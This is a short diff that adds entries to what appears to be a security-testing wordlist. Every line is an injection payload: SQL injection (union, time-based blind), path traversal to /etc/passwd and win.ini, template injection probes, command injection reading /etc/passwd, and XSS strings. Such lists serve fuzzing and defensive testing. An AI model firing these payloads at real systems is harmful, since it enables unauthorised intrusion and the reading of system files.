@@ -11,3 +11,30 @@
 ') OR "a"="a --
 <scri<script>pt>alert('123');</scri</script>pt>
 ;CAT1_GALLERY_1 UNION ALL SELECT (SELECT CAST(CHAR(114)+CHAR(51)+CHAR(100)+CHAR(109)+CHAR(48)+CHAR(118)+CHAR(51)+CHAR(95)+CHAR(104)+CHAR(118)+CHAR(106)+CHAR(95)+CHAR(105)+CHAR(110)+CHAR(106)+CHAR(101)+CHAR(99)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110) AS NVARCHAR(4000))),NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+../../../../etc/passwd
+/etc/passwd
+../../../../windows/win.ini
+${7*7}
+{{7*7}}
+<%= 7*7 %>
+{{config}}
+${env:PATH}
+cmd.exe
+/bin/cat /etc/passwd
+| cat /etc/passwd
+; cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fetc0x2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+<script>alert(1)</script>
+<IMG SRC=javascript:alert('XSS')>
+" onmouseover="alert(1)
+javascript:alert(1)
+' OR SLEEP(5)--
+1 OR SLEEP(5)
+' WAITFOR DELAY '0:0:5'--
+1' AND 1=(SELECT COUNT(*) FROM tabnames)--
+1 AND (SELECT * FROM Users)=1
+ORDER BY 1,2,3,4,5,6,7,8,9,10--
